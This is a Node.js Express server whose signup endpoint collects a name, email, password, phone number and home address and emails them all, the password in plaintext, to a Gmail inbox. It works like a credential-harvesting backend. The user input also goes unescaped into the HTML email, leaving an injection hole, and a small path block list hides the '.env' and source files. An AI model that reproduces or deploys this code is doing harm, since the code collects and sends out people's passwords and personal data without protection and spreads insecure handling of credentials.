require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const GMAIL_USER = process.env.GMAIL_USER;
const GMAIL_PASS = process.env.GMAIL_PASS;
const GMAIL_RECIPIENT = process.env.GMAIL_RECIPIENT || process.env.GMAIL_USER;

if (!GMAIL_USER || !GMAIL_PASS) {
  console.warn("Missing GMAIL_USER or GMAIL_PASS environment variables. Signup email will fail until they are configured.");
}

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: GMAIL_USER,
    pass: GMAIL_PASS
  }
});

app.use(express.json());
app.use((req, res, next) => {
  const blocked = ["/.env", "/server.js", "/package.json", "/package-lock.json"];
  if (blocked.includes(req.path)) {
    return res.status(404).end();
  }
  next();
});

app.use(express.static(path.join(__dirname, "public")));

app.post("/api/signup", async (req, res) => {
  const { fullName, email, password, phone, homeAddress } = req.body;

  if (!fullName || !email || !password || !phone || !homeAddress) {
    return res.status(400).json({ error: "Please fill in all required fields." });
  }

  const textMessage = [
    "New signup received",
    `Name: ${fullName}`,
    `Email: ${email}`,
    `Phone: ${phone}`,
    `Home address: ${homeAddress}`,
    `Password: ${password}`
  ].join("\n");

  const htmlMessage = [
    "<h2>New signup received</h2>",
    `<p><strong>Name:</strong> ${fullName}</p>`,
    `<p><strong>Email:</strong> ${email}</p>`,
    `<p><strong>Phone:</strong> ${phone}</p>`,
    `<p><strong>Home address:</strong> ${homeAddress}</p>`,
    `<p><strong>Password:</strong> ${password}</p>`
  ].join("");

  try {
    await transporter.sendMail({
      from: GMAIL_USER,
      to: GMAIL_RECIPIENT,
      subject: "New signup submission",
      text: textMessage,
      html: htmlMessage
    });

    res.json({ ok: true });
  } catch (error) {
    console.error("Gmail send failed:", error);
    res.status(500).json({ error: "Unable to send signup details by email. Try again later." });
  }
});

if (require.main === module) {
  const server = app.listen(PORT, () => {
    console.log(`Backend server running at http://localhost:${PORT}`);
  });

  server.on("error", (error) => {
    if (error.code === "EADDRINUSE") {
      const fallbackPort = Number(PORT) + 1;
      console.warn(`Port ${PORT} is already in use. Trying ${fallbackPort} instead...`);
      app.listen(fallbackPort, () => {
        console.log(`Backend server running at http://localhost:${fallbackPort}`);
      }).on("error", (fallbackError) => {
        console.error(`Unable to start server on port ${fallbackPort}:`, fallbackError);
        process.exit(1);
      });
    } else {
      console.error("Server error:", error);
      process.exit(1);
    }
  });
}

module.exports = app;
